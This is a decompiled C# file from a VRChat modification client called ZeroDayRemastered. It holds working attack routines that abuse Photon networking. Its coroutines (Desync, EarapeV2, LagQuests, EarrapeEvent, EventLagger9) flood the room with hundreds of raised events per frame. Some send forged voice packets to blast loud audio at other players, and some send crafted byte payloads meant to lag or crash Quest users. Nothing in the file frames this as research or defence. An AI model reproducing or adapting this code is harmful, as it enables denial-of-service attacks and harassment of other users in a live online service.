﻿using System;
using System.Collections;
using System.Linq;
using ExitGames.Client.Photon;
using Il2CppSystem;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;
using VRC;
using VRC.SDKBase;
using ZDBase.Utils.Wrappers;

namespace ZeroDayRemastered.PhotonEvents
{
	// Token: 0x02000056 RID: 86
	public static class PhotonEvents
	{
		// Token: 0x06000284 RID: 644 RVA: 0x000139E8 File Offset: 0x00011BE8
		public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
		{
			Object @object = Serialize.FromManagedToIL2CPP<Object>(customObject);
			PhotonNetwork.Method_Private_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, @object, RaiseEventOptions, sendOptions);
		}

		// Token: 0x06000285 RID: 645 RVA: 0x00013A07 File Offset: 0x00011C07
		public static IEnumerator Desync()
		{
			PhotonView[] photonViews = Resources.FindObjectsOfTypeAll<PhotonView>().ToArray<PhotonView>();
			while (PhotonEvents.Lagger)
			{
				int num;
				for (int i = 0; i < 3; i = num + 1)
				{
					for (int j = 0; j < photonViews.Length; j = num + 1)
					{
						PhotonEvents.OpRaiseEvent(210, new int[]
						{
							photonViews[j].viewIdField,
							Player.Method_Internal_Static_get_Player_0().Method_Public_get_VRCPlayerApi_0().playerId
						}, new RaiseEventOptions
						{
							field_Public_ReceiverGroup_0 = 0,
							field_Public_EventCaching_0 = 0
						}, default(SendOptions));
						bool flag = photonViews.Length % 3 == 0;
						bool flag2 = flag;
						if (flag2)
						{
							yield return new WaitForSecondsRealtime(0.1f);
						}
						PhotonEvents.OpRaiseEvent(209, new int[]
						{
							photonViews[j].viewIdField,
							Player.Method_Internal_Static_get_Player_0().Method_Public_get_VRCPlayerApi_0().playerId
						}, new RaiseEventOptions
						{
							field_Public_ReceiverGroup_0 = 0,
							field_Public_EventCaching_0 = 0
						}, default(SendOptions));
						num = j;
					}
					num = i;
				}
				yield return new WaitForEndOfFrame();
			}
			yield break;
		}

		// Token: 0x06000286 RID: 646 RVA: 0x00013A0F File Offset: 0x00011C0F
		public static IEnumerator EarapeV2()
		{
			while (PhotonEvents.Desyncer)
			{
				byte[] VoiceData = Convert.FromBase64String("AgAAAKWkyYm7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7DrSy5tkRecs21ljjofvebe6xsYlA4cVmgrd0=");
				byte[] nulldata = new byte[4];
				byte[] ServerTime = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
				Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
				Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
				int num;
				for (int i = 0; i < 80; i = num + 1)
				{
					PhotonEvents.OpRaiseEvent(1, VoiceData, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, default(SendOptions));
					num = i;
				}
				yield return new WaitForSecondsRealtime(0.1f);
				VoiceData = null;
				nulldata = null;
				ServerTime = null;
				VoiceData = null;
				nulldata = null;
				ServerTime = null;
			}
			yield break;
		}

		// Token: 0x06000287 RID: 647 RVA: 0x00013A17 File Offset: 0x00011C17
		public static IEnumerator LagQuests()
		{
			string s = "ap+OCswBAAAAJAA6MTg2QTEvVXNlckNhbWVyYUluZGljYXRvci9JbmRpY2F0b3IOAP8AAAAAAAAAAAoAVGltZXJCbG9vcAAAAAAEAAAL";
			byte[] Bytes = Convert.FromBase64String(s);
			while (PhotonEvents.Lagger)
			{
				yield return new WaitForEndOfFrame();
				int num;
				for (int i = 0; i < 306; i = num + 1)
				{
					PhotonEvents.OpRaiseEvent(6, Bytes, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, default(SendOptions));
					PhotonEvents.OpRaiseEvent(6, Bytes, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, default(SendOptions));
					PhotonEvents.OpRaiseEvent(6, Bytes, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, default(SendOptions));
					num = i;
				}
			}
			yield break;
		}

		// Token: 0x06000288 RID: 648 RVA: 0x00013A1F File Offset: 0x00011C1F
		public static IEnumerator EarrapeEvent()
		{
			byte[] byteArray = new byte[]
			{
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				187,
				134,
				59,
				0,
				248,
				125,
				232,
				192,
				92,
				160,
				82,
				254,
				48,
				228,
				30,
				187,
				149,
				196,
				177,
				215,
				140,
				223,
				127,
				209,
				66,
				60,
				0,
				226,
				53,
				180,
				176,
				97,
				104,
				4,
				248,
				238,
				195,
				134,
				44,
				185,
				182,
				68,
				94,
				114,
				205,
				181,
				150,
				56,
				232,
				126,
				247,
				155,
				123,
				172,
				108,
				98,
				80,
				56,
				113,
				89,
				160,
				134,
				221
			};
			Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.Method_Public_get_VRCPlayerApi_0().playerId), 0, byteArray, 0, 4);
			while (PhotonEvents.Earrape)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(PhotonNetwork.field_Public_Static_LoadBalancingClient_0.Method_Public_get_PhotonPeerPublicPo1PaTyUnique_0().ServerTimeInMilliSeconds), 0, byteArray, 4, 4);
				PhotonEvents.OpRaiseEvent(1, byteArray, new RaiseEventOptions
				{
					field_Public_ReceiverGroup_0 = 0,
					field_Public_EventCaching_0 = 0
				}, default(SendOptions));
				yield return new WaitForSeconds(0.03f);
			}
			yield break;
		}

		// Token: 0x06000289 RID: 649 RVA: 0x00013A28 File Offset: 0x00011C28
		public static int GetActorNumber(this Player player)
		{
			return (player.GetVRCPlayerApi() != null) ? player.GetVRCPlayerApi().playerId : -1;
		}

		// Token: 0x0600028A RID: 650 RVA: 0x00013A50 File Offset: 0x00011C50
		public static IEnumerator EventLagger9()
		{
			byte[] byteArray = new byte[8];
			Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.Method_Public_get_VRCPlayerApi_0().playerId.ToString() + "00001")), 0, byteArray, 0, 4);
			while (PhotonEvents.Lagger)
			{
				int num;
				for (int i = 0; i < 800; i = num + 1)
				{
					PhotonEvents.OpRaiseEvent(9, byteArray, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, default(SendOptions));
					num = i;
				}
				yield return new WaitForSecondsRealtime(0.05f);
			}
			yield break;
		}

		// Token: 0x040001B2 RID: 434
		public static bool KillQuesties;

		// Token: 0x040001B3 RID: 435
		public static float Counter;

		// Token: 0x040001B4 RID: 436
		public static bool Lagger;

		// Token: 0x040001B5 RID: 437
		public static bool Earrape;

		// Token: 0x040001B6 RID: 438
		public static bool Desyncer;

		// Token: 0x040001B7 RID: 439
		public static bool UspeakDesync;

		// Token: 0x040001B8 RID: 440
		public static bool event209;
	}
}
